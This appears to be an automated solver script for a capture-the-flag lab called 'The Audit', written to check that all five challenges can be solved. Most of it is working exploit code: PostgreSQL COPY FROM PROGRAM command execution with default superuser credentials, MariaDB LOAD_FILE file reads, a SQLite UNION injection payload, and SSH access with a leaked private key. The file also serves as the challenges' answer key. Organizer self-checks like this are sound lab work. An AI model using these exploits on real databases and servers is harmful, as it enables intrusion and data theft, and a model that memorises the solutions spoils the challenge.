#!/usr/bin/env python3
"""
The Audit — automated solver / organizer self-check.
Exploits all five findings in-network, submits each flag to the scoreboard (which
verifies it), and prints the board. Exits 0 iff all five are correct.
"""
import sys, re, io, time, json, base64, urllib.request
from datetime import datetime

SB = "http://scoreboard"


def retry(fn, tries=45, delay=2):
    last = None
    for _ in range(tries):
        try:
            return fn()
        except Exception as e:
            last = e
            time.sleep(delay)
    raise last


def mf(t):
    m = re.search(r"AUD\{[^}]*\}", t if isinstance(t, str) else (t or b"").decode("latin1"))
    return m.group(0) if m else None


# C1 — PostgreSQL COPY FROM PROGRAM RCE (weak superuser password)
def c1():
    import psycopg2
    def go():
        conn = psycopg2.connect(host="postgres", user="postgres", password="postgres",
                                dbname="postgres", connect_timeout=5)
        conn.autocommit = True
        cur = conn.cursor()
        cur.execute("DROP TABLE IF EXISTS pwn")
        cur.execute("CREATE TABLE pwn(d text)")
        cur.execute("COPY pwn FROM PROGRAM 'cat /flag'")
        cur.execute("SELECT d FROM pwn")
        out = cur.fetchone()[0]
        conn.close()
        return mf(out)
    return retry(go)


# C2 — MySQL/MariaDB FILE privilege + secure_file_priv="" LOAD_FILE
def c2():
    import pymysql
    def go():
        conn = pymysql.connect(host="mariadb", user="appuser", password="appuser", connect_timeout=5)
        cur = conn.cursor()
        cur.execute("SELECT LOAD_FILE('/flag')")
        out = cur.fetchone()[0]
        conn.close()
        return mf(out)
    return retry(go)


# C3 — SQLite UNION injection in the catalog API
def c3():
    import requests
    payload = "0 UNION SELECT id,k,v FROM ops_secret_vault--"
    def go():
        r = requests.get("http://webapp/api/product", params={"id": payload}, timeout=8)
        return mf(r.text)
    return retry(go)


# C4 — SSH via the leaked private key exposed in the app backup dir
def c4():
    import requests, paramiko
    def go():
        key = requests.get("http://webapp/backup/id_ed25519", timeout=8).text
        pk = paramiko.Ed25519Key.from_private_key(io.StringIO(key))
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cli.connect("ssh", username="dbadmin", pkey=pk, timeout=8,
                    allow_agent=False, look_for_keys=False)
        _, out, _ = cli.exec_command("cat /flag")
        data = out.read().decode()
        cli.close()
        return mf(data)
    return retry(go)


# C5 — log forensics: correlate the SSH breach with the exfil DB session, decode
def c5():
    def get(p):
        return urllib.request.urlopen(SB + p, timeout=8).read().decode()
    auth = get("/audit/auth.log")
    pg = get("/audit/pg_audit.log")
    m = re.search(r"(\S+) .*Accepted publickey for dbadmin from (\S+)", auth)
    breach = datetime.fromisoformat(m.group(1).replace("Z", "+00:00"))
    sess = {}
    for line in pg.splitlines():
        sm = re.search(r"sess=(\w+) start=(\S+)", line)
        cm = re.search(r"[?&]c=([A-Za-z0-9+/=]+)", line)
        if not sm:
            continue
        s = sm.group(1)
        start = datetime.fromisoformat(sm.group(2).replace("Z", "+00:00"))
        sess.setdefault(s, {"start": start, "chunks": []})
        if cm:
            sess[s]["chunks"].append(cm.group(1))
    # the attacker session: has exfil chunks AND starts within a minute of the breach
    cand = [s for s, v in sess.items()
            if v["chunks"] and 0 <= (v["start"] - breach).total_seconds() <= 60]
    return mf(base64.b64decode("".join(sess[cand[0]]["chunks"])).decode())


def submit(flag):
    data = json.dumps({"flag": flag}).encode()
    req = urllib.request.Request(SB + "/submit", data=data, headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=8).read()).get("correct", False)


NAMES = {1: "postgres COPY RCE", 2: "mysql LOAD_FILE", 3: "sqlite UNION SQLi",
         4: "ssh leaked key", 5: "log forensics"}
SOLVERS = {1: c1, 2: c2, 3: c3, 4: c4, 5: c5}

R = {}
for i in range(1, 6):
    try:
        R[i] = SOLVERS[i]()
    except Exception as e:
        R[i] = None

print("== The Audit — solver ==")
all_ok = True
for i in range(1, 6):
    f = R.get(i)
    ok = bool(f) and submit(f)
    all_ok = all_ok and ok
    print(f"  c{i}  {NAMES[i]:<22} {f or '<failed>'}  {'[✓]' if ok else '[✗]'}")
print("\nRESULT:", "ALL 5 FLAGS CAPTURED" if all_ok else "INCOMPLETE")
sys.exit(0 if all_ok else 1)
